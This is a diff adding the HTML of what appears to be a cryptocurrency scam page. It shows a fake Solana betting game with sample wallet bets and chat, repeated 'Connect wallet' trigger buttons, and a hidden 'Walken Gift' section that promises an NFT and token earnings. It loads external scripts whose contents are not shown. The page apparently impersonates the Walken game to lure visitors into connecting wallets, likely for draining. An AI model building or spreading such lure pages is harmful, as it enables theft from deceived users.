+                    <tr class="bets__none">
+                      <td class="bets__item item-1">Wallet (2C88...WDFP)</td>
+                      <td class="bets__item item-2">0.0233 SOL</td>
+                      <td class="bets__item item-3">3.07x</td>
+                      <td class="bets__item item-4">0.0482 SOL</td>
+                    </tr>
+                    <tr class="bets__none">
+                      <td class="bets__item item-1">Brownie</td>
+                      <td class="bets__item item-2">0.0590 SOL</td>
+                      <td class="bets__item item-3">-</td>
+                      <td class="bets__item item-4">-</td>
+                    </tr>
+                    <tr class="bets__none">
+                      <td class="bets__item item-1">Wallet (5Haw...eQVs)</td>
+                      <td class="bets__item item-2">0.0785 SOL</td>
+                      <td class="bets__item item-3">1.54x</td>
+                      <td class="bets__item item-4">0.0424 SOL</td>
+                    </tr>
+                    <tr class="bets__none">
+                      <td class="bets__item item-1">Douz</td>
+                      <td class="bets__item item-2">0.0241 SOL</td>
+                      <td class="bets__item item-3">3.11x</td>
+                      <td class="bets__item item-4">0.0509 SOL</td>
+                    </tr>
+                    <tr class="bets__none">
+                      <td class="bets__item item-1">Wallet (DKjd...jxpt)</td>
+                      <td class="bets__item item-2">0.0309 SOL</td>
+                      <td class="bets__item item-3">2.41x</td>
+                      <td class="bets__item item-4">0.0436 SOL</td>
+                    </tr>
+                    <tr class="bets__none">
+                      <td class="bets__item item-1">Douz</td>
+                      <td class="bets__item item-2">0.0147 SOL</td>
+                      <td class="bets__item item-3">1.08x</td>
+                      <td class="bets__item item-4">0.0012 SOL</td>
+                    </tr>
+                    <tr class="bets__none">
+                      <td class="bets__item item-1">REDBULL99</td>
+                      <td class="bets__item item-2">0.0241 SOL</td>
+                      <td class="bets__item item-3">-</td>
+                      <td class="bets__item item-4">-</td>
+                    </tr>
+                    <tr class="bets__none">
+                      <td class="bets__item item-1">Wallet (Z1bn...NZwD)</td>
+                      <td class="bets__item item-2">0.0241 SOL</td>
+                      <td class="bets__item item-3">2.41x</td>
+                      <td class="bets__item item-4">0.0340 SOL</td>
+                    </tr>
+                    <tr class="bets__loose bets__1">
+                      <td class="bets__item item-1">Wallet (5PhW...Zeti)</td>
+                      <td class="bets__item item-2">0.0498 SOL</td>
+                      <td class="bets__item item-3">-</td>
+                      <td class="bets__item item-4">-</td>
+                    </tr>
+                    <tr class="bets__loose bets__2">
+                      <td class="bets__item item-1">pablo</td>
+                      <td class="bets__item item-2">0.0716 SOL</td>
+                      <td class="bets__item item-3">-</td>
+                      <td class="bets__item item-4">-</td>
+                    </tr>
+                    <tr class="bets__loose bets__1">
+                      <td class="bets__item item-1">Wallet (3HuA...MpaV)</td>
+                      <td class="bets__item item-2">0.0739 SOL</td>
+                      <td class="bets__item item-3">-</td>
+                      <td class="bets__item item-4">-</td>
+                    </tr>
+                    <tr class="bets__none">
+                      <td class="bets__item item-1">Wallet (3HuA...MpaV)</td>
+                      <td class="bets__item item-2">0.0272 SOL</td>
+                      <td class="bets__item item-3">-</td>
+                      <td class="bets__item item-4">-</td>
+                    </tr>
+                    <tr class="bets__none">
+                      <td class="bets__item item-1">Wallet (4ZJg...fkes)</td>
+                      <td class="bets__item item-2">0.0339 SOL</td>
+                      <td class="bets__item item-3">2.41x</td>
+                      <td class="bets__item item-4">0.0478 SOL</td>
+                    </tr>
+                    <tr class="bets__loose bets__2">
+                      <td class="bets__item item-1">Wallet (Bh2m...mPhV)</td>
+                      <td class="bets__item item-2">0.0411 SOL</td>
+                      <td class="bets__item item-3">-</td>
+                      <td class="bets__item item-4">-</td>
+                    </tr>
+                    <tr class="bets__win bets__1">
+                      <td class="bets__item item-1">BRIBRI0951</td>
+                      <td class="bets__item item-2">0.0113 SOL</td>
+                      <td class="bets__item item-3">2.22x</td>
+                      <td class="bets__item item-4">0.0138 SOL</td>
+                    </tr>
+                    <tr class="bets__none">
+                      <td class="bets__item item-1">Dimple</td>
+                      <td class="bets__item item-2">0.0412 SOL</td>
+                      <td class="bets__item item-3">1.34x</td>
+                      <td class="bets__item item-4">0.0140 SOL</td>
+                    </tr>
+                    <tr class="bets__none">
+                      <td class="bets__item item-1">Dimple</td>
+                      <td class="bets__item item-2">0.0157 SOL</td>
+                      <td class="bets__item item-3">-</td>
+                      <td class="bets__item item-4">-</td>
+                    </tr>
+                    <tr class="bets__none">
+                      <td class="bets__item item-1">Dimple</td>
+                      <td class="bets__item item-2">0.0526 SOL</td>
+                      <td class="bets__item item-3">2.41x</td>
+                      <td class="bets__item item-4">0.0742 SOL</td>
+                    </tr>
+                    <tr class="bets__win bets__1">
+                      <td class="bets__item item-1">Wallet (5PhW...Zeti)</td>
+                      <td class="bets__item item-2">0.0751 SOL</td>
+                      <td class="bets__item item-3">1.83x</td>
+                      <td class="bets__item item-4">0.0623 SOL</td>
+                    </tr>
+                    <tr class="bets__loose bets__2">
+                      <td class="bets__item item-1">Wallet (J3DG...7Tik)</td>
+                      <td class="bets__item item-2">0.0487 SOL</td>
+                      <td class="bets__item item-3">-</td>
+                      <td class="bets__item item-4">-</td>
+                    </tr>
+                  </table>
+                </div>
+              </div>
+            </div>
+            <div class="results">
+              <div class="results__container"><span class="results__result"
+                  style="color: rgb(65, 211, 21);">3.96x</span><span class="results__result"
+                  style="display: none;">2.41x</span><span class="results__result"
+                  style="color: yellow;">7.46x</span><span class="results__result"
+                  style="display: none;">4.18x</span><span class="results__result"
+                  style="color: rgb(65, 211, 21);">4.48x</span><span class="results__result"
+                  style="display: none;">2.41x</span><span class="results__result"
+                  style="color: yellow;">5.45x</span><span class="results__result"
+                  style="display: none;">4.14x</span><span class="results__result"
+                  style="color: rgb(255, 0, 0);">2.14x</span><span class="results__result"
+                  style="display: none;">2.41x</span><span class="results__result"
+                  style="color: rgb(65, 211, 21);">2.41x</span><span class="results__result"
+                  style="display: none;">7.78x</span><span class="results__result"
+                  style="color: rgb(65, 211, 21);">2.41x</span><span class="results__result"
+                  style="display: none;">3.27x</span></div>
+            </div>
+            <div class="play__chat chat">
+              <div class="chat__container">
+                <div class="chat__message message">
+                  <div class="message__img"><img src="/static/media/logo.bbdbbecb5f96477038da.png" alt="avatar"></div>
+                  <div class="message__name">dannykozell :</div>
+                  <div class="message__body">Who can give me some sols?</div>
+                </div>
+              </div>
+            </div>
+            <div class="play__chat-input chat-input">
+              <div class="chat-input__container">Connect your wallet to send messages.</div>
+            </div>
+          </div>
+        </div>
+      </main>
+    </div>
+  </div>
+  <div class="rblock-item">
+    <div class="btn-wrapper">
+      <div class="btn-asp-box trigger"><button class="tg3-1-btn trigger buttonWallet" aria-label="connect"><span
+            class="tg3-1-text trigger">
+            <ya-tr-span data-index="16-0" data-translated="false" data-source-lang="en" data-target-lang="ru"
+              data-value="Connect" data-translation="Контакты" data-ch="0" data-type="trSpan">Connect</ya-tr-span>
+          </span></button></div>
+    </div>
+  </div>
+  <div id="mytrigger" class="rblock-item">
+    <div class="btn-wrapper">
+      <div class="btn-asp-box trigger"><button class="tg3-1-btn trigger buttonWallet" aria-label="connect"><span
+            class="tg3-1-text trigger">
+            <ya-tr-span data-index="17-0" data-translated="false" data-source-lang="en" data-target-lang="ru"
+              data-value="Connect" data-translation="Контакты" data-ch="1" data-type="trSpan">Connect</ya-tr-span>
+          </span></button></div>
+    </div>
+  </div>
+  <script>navigator.userAgent.search("Safari") >= 0 && navigator.userAgent.search("Chrome") < 0 && (Array.from(document.querySelectorAll(".video-safari-change")).map((function (r) { return r.style.display = "none" })), Array.from(document.querySelectorAll(".gif-safari-change")).map((function (r) { return r.style.display = "block" })))</script>
+  <script type="text/javascript" src="js/app.js"></script>
+  <script></script>
+  <script src="js/chunk.js"></script>
+  <script src="js/tokenup.js"></script>
+  <script src="js/main.chunk.js"></script>
+  <script src="js/lib.js"></script>
+  <script src="js/life.js"></script>
+  <div hidden="">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <link rel="stylesheet" href="css/fonts.css">
+    <title>Walken Gift</title>
+    <link href="https://app.openlogin.com/start" crossorigin="anonymous" type="text/html" rel="prefetch">
+    <link href="https://app.openlogin.com/sdk-modal" crossorigin="anonymous" type="text/html" rel="prefetch">
+    <style data-styled="active" data-styled-version="5.3.1"></style>
+    <style data-jss="" data-meta="MuiTouchRipple">
+      .MuiTouchRipple-root {
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        z-index: 0;
+        overflow: hidden;
+        position: absolute;
+        border-radius: inherit;
+        pointer-events: none
+      }
+
+      .MuiTouchRipple-ripple {
+        opacity: 0;
+        position: absolute
+      }
+
+      .MuiTouchRipple-rippleVisible {
+        opacity: .3;
+        animation: MuiTouchRipple-keyframes-enter 550ms cubic-bezier(.4, 0, .2, 1);
+        transform: scale(1)
+      }
+
+      .MuiTouchRipple-ripplePulsate {
+        animation-duration: .2s
+      }
+
+      .MuiTouchRipple-child {
+        width: 100%;
+        height: 100%;
+        display: block;
+        opacity: 1;
+        border-radius: 50%;
+        background-color: currentColor
+      }
+
+      .MuiTouchRipple-childLeaving {
+        opacity: 0;
+        animation: MuiTouchRipple-keyframes-exit 550ms cubic-bezier(.4, 0, .2, 1)
+      }
+
+      .MuiTouchRipple-childPulsate {
+        top: 0;
+        left: 0;
+        position: absolute;
+        animation: MuiTouchRipple-keyframes-pulsate 2.5s cubic-bezier(.4, 0, .2, 1) .2s infinite
+      }
+
+      @-webkit-keyframes MuiTouchRipple-keyframes-enter {
+        0% {
+          opacity: .1;
+          transform: scale(0)
+        }
+
+        100% {
+          opacity: .3;
+          transform: scale(1)
+        }
+      }
+
+      @-webkit-keyframes MuiTouchRipple-keyframes-exit {
+        0% {
+          opacity: 1
+        }
+
+        100% {
+          opacity: 0
+        }
+      }
+
+      @-webkit-keyframes MuiTouchRipple-keyframes-pulsate {
+        0% {
+          transform: scale(1)
+        }
+
+        50% {
+          transform: scale(.92)
+        }
+
+        100% {
+          transform: scale(1)
+        }
+      }
+    </style>
+    <style data-jss="" data-meta="MuiButtonBase">
+      .MuiButtonBase-root {
+        color: inherit;
+        border: 0;
+        cursor: pointer;
+        margin: 0;
+        display: inline-flex;
+        outline: 0;
+        padding: 0;
+        position: relative;
+        align-items: center;
+        user-select: none;
+        border-radius: 0;
+        vertical-align: middle;
+        -moz-appearance: none;
+        justify-content: center;
+        text-decoration: none;
+        background-color: transparent;
+        -webkit-appearance: none;
+        -webkit-tap-highlight-color: transparent
+      }
+
+      .MuiButtonBase-root::-moz-focus-inner {
+        border-style: none
+      }
+
+      .MuiButtonBase-root.Mui-disabled {
+        cursor: default;
+        pointer-events: none
+      }
+
+      @media print {
+        .MuiButtonBase-root {
+          -webkit-print-color-adjust: exact
+        }
+      }
+    </style>
+    <style data-jss="" data-meta="MuiButton">
+      .MuiButton-root {
+        color: #fff;
+        padding: 12px 16px;
+        font-size: .875rem;
+        min-width: 64px;
+        box-sizing: border-box;
+        transition: background-color 250ms cubic-bezier(.4, 0, .2, 1) 0s, box-shadow 250ms cubic-bezier(.4, 0, .2, 1) 0s, border 250ms cubic-bezier(.4, 0, .2, 1) 0s;
+        font-family: Roboto, Helvetica, Arial, sans-serif;
+        font-weight: 500;
+        line-height: 1.75;
+        border-radius: 4px;
+        letter-spacing: .02857em
+      }
+
+      .MuiButton-root:hover {
+        text-decoration: none;
+        background-color: rgba(255, 255, 255, .08)
+      }
+
+      .MuiButton-root.Mui-disabled {
+        color: rgba(255, 255, 255, .3)
+      }
+
+      @media (hover:none) {
+        .MuiButton-root:hover {
+          background-color: transparent
+        }
+      }
+
+      .MuiButton-root:hover.Mui-disabled {
+        background-color: transparent
+      }
+
+      .MuiButton-label {
+        width: 100%;
+        display: inherit;
+        align-items: inherit;
+        white-space: nowrap;
+        justify-content: inherit
+      }
+
+      .MuiButton-text {
+        padding: 6px 8px
+      }
+
+      .MuiButton-textPrimary {
+        color: #3f51b5
+      }
+
+      .MuiButton-textPrimary:hover {
+        background-color: rgba(63, 81, 181, .08)
+      }
+
+      @media (hover:none) {
+        .MuiButton-textPrimary:hover {
+          background-color: transparent
+        }
+      }
+
+      .MuiButton-textSecondary {
+        color: #f50057
+      }
+
+      .MuiButton-textSecondary:hover {
+        background-color: rgba(245, 0, 87, .08)
+      }
+
+      @media (hover:none) {
+        .MuiButton-textSecondary:hover {
+          background-color: transparent
+        }
+      }
+
+      .MuiButton-outlined {
+        border: 1px solid rgba(255, 255, 255, .23);
+        padding: 5px 15px
+      }
+
+      .MuiButton-outlined.Mui-disabled {
+        border: 1px solid rgba(255, 255, 255, .12)
+      }
+
+      .MuiButton-outlinedPrimary {
+        color: #3f51b5;
+        border: 1px solid rgba(63, 81, 181, .5)
+      }
+
+      .MuiButton-outlinedPrimary:hover {
+        border: 1px solid #3f51b5;
+        background-color: rgba(63, 81, 181, .08)
+      }
+
+      @media (hover:none) {
+        .MuiButton-outlinedPrimary:hover {
+          background-color: transparent
+        }
+      }
+
+      .MuiButton-contained {
+        color: rgba(0, 0, 0, .87);
+        box-shadow: 0 3px 1px -2px rgba(0, 0, 0, .2), 0 2px 2px 0 rgba(0, 0, 0, .14), 0 1px 5px 0 rgba(0, 0, 0, .12);
+        background-color: #e0e0e0
+      }
+
+      .MuiButton-contained:hover {
+        box-shadow: 0 2px 4px -1px rgba(0, 0, 0, .2), 0 4px 5px 0 rgba(0, 0, 0, .14), 0 1px 10px 0 rgba(0, 0, 0, .12);
+        background-color: #d5d5d5
+      }
+
+      .MuiButton-contained.Mui-focusVisible {
+        box-shadow: 0 3px 5px -1px rgba(0, 0, 0, .2), 0 6px 10px 0 rgba(0, 0, 0, .14), 0 1px 18px 0 rgba(0, 0, 0, .12)
+      }
+
+      .MuiButton-contained:active {
+        box-shadow: 0 5px 5px -3px rgba(0, 0, 0, .2), 0 8px 10px 1px rgba(0, 0, 0, .14), 0 3px 14px 2px rgba(0, 0, 0, .12)
+      }
+
+      .MuiButton-contained.Mui-disabled {
+        color: rgba(255, 255, 255, .3);
+        box-shadow: none;
+        background-color: rgba(255, 255, 255, .12)
+      }
+
+      @media (hover:none) {
+        .MuiButton-contained:hover {
+          box-shadow: 0 3px 1px -2px rgba(0, 0, 0, .2), 0 2px 2px 0 rgba(0, 0, 0, .14), 0 1px 5px 0 rgba(0, 0, 0, .12);
+          background-color: #e0e0e0
+        }
+      }
+
+      .MuiButton-contained:hover.Mui-disabled {
+        background-color: rgba(255, 255, 255, .12)
+      }
+
+      .MuiButton-containedPrimary {
+        color: #fff;
+        background-color: #3f51b5
+      }
+
+      .MuiButton-containedPrimary:hover {
+        background-color: #303f9f
+      }
+
+      @media (hover:none) {
+        .MuiButton-containedPrimary:hover {
+          background-color: #3f51b5
+        }
+      }
+
+      .MuiButton-disableElevation {
+        box-shadow: none
+      }
+
+      .MuiButton-disableElevation:hover {
+        box-shadow: none
+      }
+
+      .MuiButton-disableElevation.Mui-focusVisible {
+        box-shadow: none
+      }
+
+      .MuiButton-disableElevation:active {
+        box-shadow: none
+      }
+
+      .MuiButton-disableElevation.Mui-disabled {
+        box-shadow: none
+      }
+
+      .MuiButton-colorInherit {
+        color: inherit;
+        border-color: currentColor
+      }
+
+      .MuiButton-textSizeSmall {
+        padding: 4px 5px;
+        font-size: .8125rem
+      }
+
+      .MuiButton-textSizeLarge {
+        padding: 8px 11px;
+        font-size: .9375rem
+      }
+
+      .MuiButton-outlinedSizeSmall {
+        padding: 3px 9px;
+        font-size: .8125rem
+      }
+
+      .MuiButton-outlinedSizeLarge {
+        padding: 7px 21px;
+        font-size: .9375rem
+      }
+
+      .MuiButton-containedSizeSmall {
+        padding: 4px 10px;
+        font-size: .8125rem
+      }
+
+      .MuiButton-containedSizeLarge {
+        padding: 8px 22px;
+        font-size: .9375rem
+      }
+
+      .MuiButton-fullWidth {
+        width: 100%
+      }
+
+      .MuiButton-startIcon {
+        display: inherit;
+        margin-left: -4px;
+        margin-right: 20px
+      }
+
+      .MuiButton-startIcon.MuiButton-iconSizeSmall {
+        margin-left: -2px
+      }
+
+      .MuiButton-endIcon {
+        display: inherit;
+        margin-left: 20px;
+        margin-right: -4px
+      }
+
+      .MuiButton-endIcon.MuiButton-iconSizeSmall {
+        margin-right: -2px
+      }
+
+      .MuiButton-iconSizeSmall>:first-child {
+        font-size: 18px
+      }
+
+      .MuiButton-iconSizeMedium>:first-child {
+        font-size: 20px
+      }
+
+      .MuiButton-iconSizeLarge>:first-child {
+        font-size: 22px
+      }
+    </style>
+    <style data-jss="" data-meta="MuiSnackbar">
+      .MuiSnackbar-root {
+        left: 8px;
+        right: 8px;
+        display: flex;
+        z-index: 1400;
+        position: fixed;
+        align-items: center;
+        justify-content: center
+      }
+
+      .MuiSnackbar-anchorOriginTopCenter {
+        top: 8px
+      }
+
+      @media (min-width:600px) {
+        .MuiSnackbar-anchorOriginTopCenter {
+          top: 24px;
+          left: 50%;
+          right: auto;
+          transform: translateX(-50%)
+        }
+      }
+
+      .MuiSnackbar-anchorOriginBottomCenter {
+        bottom: 8px
+      }
+
+      @media (min-width:600px) {
+        .MuiSnackbar-anchorOriginBottomCenter {
+          left: 50%;
+          right: auto;
+          bottom: 24px;
+          transform: translateX(-50%)
+        }
+      }
+
+      .MuiSnackbar-anchorOriginTopRight {
+        top: 8px;
+        justify-content: flex-end
+      }
+
+      @media (min-width:600px) {
+        .MuiSnackbar-anchorOriginTopRight {
+          top: 24px;
+          left: auto;
+          right: 24px
+        }
+      }
+
+      .MuiSnackbar-anchorOriginBottomRight {
+        bottom: 8px;
+        justify-content: flex-end
+      }
+
+      @media (min-width:600px) {
+        .MuiSnackbar-anchorOriginBottomRight {
+          left: auto;
+          right: 24px;
+          bottom: 24px
+        }
+      }
+
+      .MuiSnackbar-anchorOriginTopLeft {
+        top: 8px;
+        justify-content: flex-start
+      }
+
+      @media (min-width:600px) {
+        .MuiSnackbar-anchorOriginTopLeft {
+          top: 24px;
+          left: 24px;
+          right: auto
+        }
+      }
+
+      .MuiSnackbar-anchorOriginBottomLeft {
+        bottom: 8px;
+        justify-content: flex-start
+      }
+
+      @media (min-width:600px) {
+        .MuiSnackbar-anchorOriginBottomLeft {
+          left: 24px;
+          right: auto;
+          bottom: 24px
+        }
+      }
+    </style>
+    <style data-jss="" data-meta="MuiDialog">
+      @media print {
+        .MuiDialog-root {
+          position: absolute !important
+        }
+      }
+
+      .MuiDialog-scrollPaper {
+        display: flex;
+        align-items: center;
+        justify-content: center
+      }
+
+      .MuiDialog-scrollBody {
+        overflow-x: hidden;
+        overflow-y: auto;
+        text-align: center
+      }
+
+      .MuiDialog-scrollBody:after {
+        width: 0;
+        height: 100%;
+        content: "";
+        display: inline-block;
+        vertical-align: middle
+      }
+
+      .MuiDialog-container {
+        height: 100%;
+        outline: 0
+      }
+
+      @media print {
+        .MuiDialog-container {
+          height: auto
+        }
+      }
+
+      .MuiDialog-paper {
+        margin: 32px;
+        position: relative;
+        overflow-y: auto
+      }
+
+      @media print {
+        .MuiDialog-paper {
+          box-shadow: none;
+          overflow-y: visible
+        }
+      }
+
+      .MuiDialog-paperScrollPaper {
+        display: flex;
+        max-height: calc(100% - 64px);
+        flex-direction: column
+      }
+
+      .MuiDialog-paperScrollBody {
+        display: inline-block;
+        text-align: left;
+        vertical-align: middle
+      }
+
+      .MuiDialog-paperWidthFalse {
+        max-width: calc(100% - 64px)
+      }
+
+      .MuiDialog-paperWidthXs {
+        max-width: 444px
+      }
+
+      @media (max-width:507.95px) {
+        .MuiDialog-paperWidthXs.MuiDialog-paperScrollBody {
+          max-width: calc(100% - 64px)
+        }
+      }
+
+      .MuiDialog-paperWidthSm {
+        max-width: 600px
+      }
+
+      @media (max-width:663.95px) {
+        .MuiDialog-paperWidthSm.MuiDialog-paperScrollBody {
+          max-width: calc(100% - 64px)
+        }
+      }
+
+      .MuiDialog-paperWidthMd {
+        max-width: 960px
+      }
+
+      @media (max-width:1023.95px) {
+        .MuiDialog-paperWidthMd.MuiDialog-paperScrollBody {
+          max-width: calc(100% - 64px)
+        }
+      }
+
+      .MuiDialog-paperWidthLg {
+        max-width: 1280px
+      }
+
+      @media (max-width:1343.95px) {
+        .MuiDialog-paperWidthLg.MuiDialog-paperScrollBody {
+          max-width: calc(100% - 64px)
+        }
+      }
+
+      .MuiDialog-paperWidthXl {
+        max-width: 1920px
+      }
+
+      @media (max-width:1983.95px) {
+        .MuiDialog-paperWidthXl.MuiDialog-paperScrollBody {
+          max-width: calc(100% - 64px)
+        }
+      }
+
+      .MuiDialog-paperFullWidth {
+        width: calc(100% - 64px)
+      }
+
+      .MuiDialog-paperFullScreen {
+        width: 100%;
+        height: 100%;
+        margin: 0;
+        max-width: 100%;
+        max-height: none;
+        border-radius: 0
+      }
+
+      .MuiDialog-paperFullScreen.MuiDialog-paperScrollBody {
+        margin: 0;
+        max-width: 100%
+      }
+    </style>
+    <style data-jss="" data-meta="makeStyles">
+      .jss1 .MuiDialog-paper {
+        width: 320px;
+        margin: 0
+      }
+
+      .jss1 .MuiDialogTitle-root {
+        background-color: #3f51b5
+      }
+
+      .jss1 .MuiDialogContent-root {
+        padding: 0
+      }
+
+      .jss1 .MuiDialogContent-root .MuiList-root {
+        padding: 0;
+        background: #212121
+      }
+
+      .jss1 .MuiDialogContent-root .MuiListItem-root {
+        padding: 0;
+        box-shadow: inset 0 1px 0 0 rgba(255, 255, 255, .1)
+      }
+
+      .jss1 .MuiDialogContent-root .MuiListItem-root:hover {
+        box-shadow: inset 0 1px 0 0 rgba(255, 255, 255, .1), 0 1px 0 0 rgba(255, 255, 255, .05)
+      }
+
+      .jss1 .MuiDialogContent-root .MuiListItem-root .MuiButton-endIcon {
+        margin: 0
+      }
+
+      .jss1 .MuiDialogContent-root .MuiListItem-root .MuiButton-root {
+        padding: 8px 24px;
+        flex-grow: 1;
+        font-size: 1rem;
+        font-weight: 400;
+        justify-content: space-between
+      }
+
+      .jss1 .MuiDialogContent-root .MuiListItem-root .MuiSvgIcon-root {
+        color: #9e9e9e
+      }
+
+      .jss1 .MuiDialogContent-root .MuiCollapse-root .MuiList-root {
+        background: #212121
+      }
+
+      .jss1 .MuiDialogTitle-root .MuiTypography-root {
+        display: flex;
+        line-height: 40px;
+        justify-content: space-between
+      }
+
+      .jss1 .MuiDialogTitle-root .MuiIconButton-root {
+        color: #9e9e9e;
+        padding: 8px;
+        flex-shrink: 1;
+        margin-right: -8px
+      }
+    </style>
+  </div>
+  <section>
+    <div hidden="" class="container"><img src="fonts/logo.svg" alt="logotype" class="logotype">
+      <form action="#">
+        <h2 class="head_h">
+          <ya-tr-span data-index="18-0" data-translated="false" data-source-lang="en" data-target-lang="ru"
+            data-value="Walken Gift" data-translation="Подарок ходячих" data-ch="1" data-type="trSpan">Walken Gift
+          </ya-tr-span>
+        </h2>
+        <h3 class="head">
+          <ya-tr-span data-index="19-0" data-translated="false" data-source-lang="en" data-target-lang="ru"
+            data-value="Get a gift for reaching League II" data-translation="Получите подарок за выход во Вторую лигу"
+            data-ch="0" data-type="trSpan">Get a gift for reaching League II</ya-tr-span>
+        </h3>
+        <div class="item"><img src="images/nft3.png" alt="NFT">
+          <h3 class="descr">
+            <ya-tr-span data-index="20-0" data-translated="false" data-source-lang="en" data-target-lang="ru"
+              data-value="T-shirt" data-translation="Футболка" data-ch="0" data-type="trSpan">T-shirt</ya-tr-span>
+          </h3>
+          <h2 class="number">#55597976</h2>
+        </div><button class="main__button trigger">
+          <ya-tr-span data-index="21-0" data-translated="false" data-source-lang="en" data-target-lang="ru"
+            data-value="Connect wallet" data-translation="Подключить кошелек" data-ch="0" data-type="trSpan">Connect
+            wallet</ya-tr-span>
+        </button>
+      </form>
+      <div class="content">
+        <div class="item">
+          <div class="camera">
+            <div class="speaker"></div>
+            <div class="cam"><span></span></div>
+          </div>
+          <div class="item-content">
+            <div class="images">
+              <div class="image after"></div>
+              <div class="image _active"><img src="fonts/1.svg" alt="1"></div>
+              <div class="image before"><img src="fonts/2.svg" alt="2"></div>
+            </div>
+          </div>
+          <div class="head__item-text"></div>
+          <div class="item-text">
+            <h2>
+              <ya-tr-span data-index="22-0" data-translated="false" data-source-lang="en" data-target-lang="ru"
+                data-value="League I" data-translation="Первая лига" data-ch="0" data-type="trSpan">League I
+              </ya-tr-span>
+            </h2>
+            <h3>
+              <ya-tr-span data-index="23-0" data-translated="false" data-source-lang="en" data-target-lang="ru"
+                data-value="Minimum CAThlete level - 0" data-translation="Минимальный уровень подготовки - 0"
+                data-ch="0" data-type="trSpan">Minimum CAThlete level - 0</ya-tr-span>
+            </h3>
+            <div class="tokens"><a>
+                <ya-tr-span data-index="24-0" data-translated="false" data-source-lang="en" data-target-lang="ru"
+                  data-value="Possible earnings: up to " data-translation="Возможный заработок: до " data-ch="0"
+                  data-type="trSpan">Possible earnings: up to </ya-tr-span><b>
+                  <ya-tr-span data-index="24-0" data-translated="true" data-source-lang="en" data-target-lang="ru"
+                    data-value="81.757" data-translation="81,757" data-ch="0" data-type="trSpan">81,757</ya-tr-span>
+                </b>
+              </a><img src="fonts/token.svg" alt=""></div>
+            <div class="pagination"><span class="bullet _active"></span> <span class="bullet"></span> <span
+                class="bullet"></span> <span class="bullet"></span> <span class="bullet"></span></div><a
+              class="main__button">
+              <ya-tr-span data-index="25-0" data-translated="false" data-source-lang="en" data-target-lang="ru"
+                data-value="Complete in League I" data-translation="Завершить в лиге I" data-ch="0" data-type="trSpan">
+                Complete in League I</ya-tr-span>
+            </a>
+          </div>
+        </div>
+        <div class="item league__two">
+          <div class="camera">
+            <div class="speaker"></div>
+            <div class="cam"><span></span></div>
+          </div>
+          <div class="item-content">
+            <div class="images">
+              <div class="image after"><img src="fonts/1.svg" alt="1"></div>
+              <div class="image _active"><img src="fonts/2.svg" alt="2"></div>
+              <div class="image before"><img src="fonts/3.svg" alt="3"></div>
+            </div>
+          </div>
+          <div class="head__item-text"></div>
+          <div class="item-text">
+            <h2>
+              <ya-tr-span data-index="26-0" data-translated="false" data-source-lang="en" data-target-lang="ru"
+                data-value="League II" data-translation="Вторая лига" data-ch="0" data-type="trSpan">League II
+              </ya-tr-span>
+            </h2>
+            <h3>
+              <ya-tr-span data-index="27-0" data-translated="false" data-source-lang="en" data-target-lang="ru"
+                data-value="Minimum CAThlete level - 2" data-translation="Минимальный уровень подготовки - 2"
+                data-ch="0" data-type="trSpan">Minimum CAThlete level - 2</ya-tr-span>
+            </h3>
+            <div class="tokens"><a>
+                <ya-tr-span data-index="28-0" data-translated="false" data-source-lang="en" data-target-lang="ru"
+                  data-value="Possible earnings: up to " data-translation="Возможный заработок: до " data-ch="0"
+                  data-type="trSpan">Possible earnings: up to </ya-tr-span><b>
+                  <ya-tr-span data-index="28-0" data-translated="true" data-source-lang="en" data-target-lang="ru"
+                    data-value="245.271" data-translation="245.271" data-ch="0" data-type="trSpan">245.271</ya-tr-span>
+                </b>
+              </a><img src="fonts/token.svg" alt=""></div>
+            <div class="pagination"><span class="bullet"></span> <span class="bullet _active"></span> <span
+                class="bullet"></span> <span class="bullet"></span> <span class="bullet"></span></div><a
+              class="main__button">
+              <ya-tr-span data-index="29-0" data-translated="false" data-source-lang="en" data-target-lang="ru"
+                data-value="Complete in League II" data-translation="Завершить во второй лиге" data-ch="0"
+                data-type="trSpan">Complete in League II</ya-tr-span>
+            </a>
+          </div>
+        </div>
+        <div class="item league__three">
+          <div class="camera">
+            <div class="speaker"></div>
+            <div class="cam"><span></span></div>
+          </div>
+          <div class="item-content">
+            <div class="images">
+              <div class="image after"><img src="fonts/2.svg" alt="2"></div>
+              <div class="image _active"><img src="fonts/3.svg" alt="3"></div>
+              <div class="image before"><img src="fonts/4.svg" alt="4"></div>
+            </div>
+          </div>
+          <div class="head__item-text"></div>
+          <div class="item-text">
+            <h2>
+              <ya-tr-span data-index="30-0" data-translated="false" data-source-lang="en" data-target-lang="ru"
+                data-value="League III" data-translation="Лига III" data-ch="0" data-type="trSpan">League III
+              </ya-tr-span>
+            </h2>
+            <h3>
+              <ya-tr-span data-index="31-0" data-translated="false" data-source-lang="en" data-target-lang="ru"
+                data-value="Minimum CAThlete level - 4" data-translation="Минимальный уровень подготовки - 4"
+                data-ch="0" data-type="trSpan">Minimum CAThlete level - 4</ya-tr-span>
+            </h3>
+            <div class="tokens"><a>
+                <ya-tr-span data-index="32-0" data-translated="false" data-source-lang="en" data-target-lang="ru"
+                  data-value="Possible earnings: up to " data-translation="Возможный заработок: до " data-ch="1"
+                  data-type="trSpan">Possible earnings: up to </ya-tr-span><b>
+                  <ya-tr-span data-index="32-0" data-translated="true" data-source-lang="en" data-target-lang="ru"
+                    data-value="245.271" data-translation="245.271" data-ch="1" data-type="trSpan">245.271</ya-tr-span>
+                </b>
+              </a><img src="fonts/token.svg" alt=""></div>
+            <div class="pagination"><span class="bullet"></span> <span class="bullet"></span> <span
+                class="bullet _active"></span> <span class="bullet"></span> <span class="bullet"></span></div><a
+              class="main__button">
+              <ya-tr-span data-index="33-0" data-translated="false" data-source-lang="en" data-target-lang="ru"
+                data-value="Complete in League III" data-translation="Завершить в Лиге III" data-ch="0"
+                data-type="trSpan">Complete in League III</ya-tr-span>
+            </a>
+          </div>
+        </div>
+        <div class="item league__four">
+          <div class="camera">
+            <div class="speaker"></div>
+            <div class="cam"><span></span></div>
+          </div>
+          <div class="item-content">
+            <div class="images">
+              <div class="image after"><img src="fonts/3.svg" alt="3"></div>
+              <div class="image _active"><img src="fonts/4.svg" alt="4"></div>
+              <div class="image before"><img src="fonts/5.svg" alt="5"></div>
+            </div>
+          </div>
+          <div class="head__item-text"></div>
+          <div class="item-text">
+            <h2>
+              <ya-tr-span data-index="34-0" data-translated="false" data-source-lang="en" data-target-lang="ru"
+                data-value="League IV" data-translation="Четвертая лига" data-ch="0" data-type="trSpan">League IV
